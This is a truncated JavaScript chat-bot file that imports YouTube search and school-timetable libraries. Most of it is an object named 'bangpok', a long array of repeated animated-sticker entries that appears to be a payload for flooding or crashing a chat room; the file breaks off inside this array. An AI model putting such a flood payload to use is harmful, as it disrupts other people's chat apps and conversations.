var emergency = false;
const ytSearch = require("yt-search");
const Timetable = require("comcigan-parser");
const timetable = new Timetable();
var level;
let bangpok = {
  os: [
    { t: 1, ct: "", jct: "" },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
